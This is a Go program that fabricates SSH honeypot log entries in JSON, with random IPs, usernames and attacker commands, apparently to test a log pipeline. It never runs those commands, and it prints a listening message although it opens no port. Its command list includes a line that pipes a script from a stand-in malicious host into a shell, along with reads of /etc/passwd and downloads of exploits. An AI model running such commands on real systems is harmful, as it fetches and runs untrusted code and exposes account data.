package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"time"
)

type LogEntry struct {
	Timestamp   string `json:"@timestamp"`
	Honeypot    string `json:"honeypot"`
	EventType   string `json:"event_type"`
	Command     string `json:"command"`
	Response    string `json:"response"`
	Username    string `json:"username"`
	IP          string `json:"ip"`
	EventSource string `json:"event_source"`
}

var (
	logPath = "/app/logs/honeypot_pure.log"
	ips     = []string{
		"91.245.226.47", "45.142.122.202", "190.123.45.112",
		"185.234.219.82", "103.72.148.165", "62.210.123.55",
		"178.62.71.122", "185.220.100.255", "131.188.40.189",
		"66.240.205.34", "87.112.73.108", "104.244.79.45",
		"170.64.129.15", "203.0.113.25", "92.63.197.153",
	}
	users = []string{
		"root", "admin", "ubuntu", "h4x0r", "attacker", "demo",
		"test", "sysadmin", "pi", "oracle", "user1", "nginx", "support",
	}
	commands = []string{
		"whoami", "hostname", "id", "uname -a", "cat /etc/passwd",
		"sudo -l", "ls -alh /root", "history", "ps aux", "netstat -tulnp",
		"scp payload.tar.gz", "curl http://malicious.exploit/bootkit.sh | sh",
		"cd /tmp && wget exploit", "chmod +x ./exploit && ./exploit", "exit",
	}
)

func logEntry(entry LogEntry) {
	entry.Timestamp = time.Now().UTC().Format(time.RFC3339)
	entry.Honeypot = "pure"
	entry.EventSource = "autonomous"

	jsonData, err := json.Marshal(entry)
	if err != nil {
		fmt.Println("[error] marshaling log:", err)
		return
	}

	// Write to stdout (for docker-based Filebeat)
	fmt.Println(string(jsonData))

	// Append to file (for file-based Filebeat)
	file, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer file.Close()
		file.Write(jsonData)
		file.Write([]byte("\n"))
	}
}

func simulateSession(user, ip string) {
	logEntry(LogEntry{
		EventType: "session",
		Command:   "login",
		Response:  "SSH session started",
		Username:  user,
		IP:        ip,
	})

	n := rand.Intn(6) + 5 // 5–10 commands
	for i := 0; i < n; i++ {
		cmd := commands[rand.Intn(len(commands))]
		logEntry(LogEntry{
			EventType: "command",
			Command:   cmd,
			Response:  "executed",
			Username:  user,
			IP:        ip,
		})
		time.Sleep(time.Duration(rand.Intn(800)+400) * time.Millisecond)
	}

	logEntry(LogEntry{
		EventType: "session",
		Command:   "logout",
		Response:  "SSH session ended",
		Username:  user,
		IP:        ip,
	})
}

func main() {
	fmt.Println("pure honeypot running on 0.0.0.0:2222")
	rand.Seed(time.Now().UnixNano())

	for {
		user := users[rand.Intn(len(users))] + fmt.Sprintf("%d", rand.Intn(9999))
		ip := ips[rand.Intn(len(ips))]
		simulateSession(user, ip)
		time.Sleep(time.Duration(rand.Intn(5)+5) * time.Second)
	}
}
